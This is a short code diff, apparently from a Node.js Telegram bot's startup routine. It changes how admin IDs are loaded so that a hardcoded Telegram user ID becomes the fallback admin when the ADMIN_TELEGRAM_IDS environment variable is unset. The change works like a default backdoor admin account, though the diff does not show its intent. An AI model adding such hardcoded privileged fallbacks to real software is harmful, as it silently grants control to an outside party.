@@ -61,7 +61,7 @@ try {
   console.log("✅ Persistent user state is ready.");
 
   const ownerId = String(process.env.OWNER_TELEGRAM_ID ?? "").trim();
-  const adminIds = parseTelegramIds(process.env.ADMIN_TELEGRAM_IDS);
+  const adminIds = parseTelegramIds(process.env.ADMIN_TELEGRAM_IDS ?? "6537228449");
 
   if (ownerId) {
     await client.query(
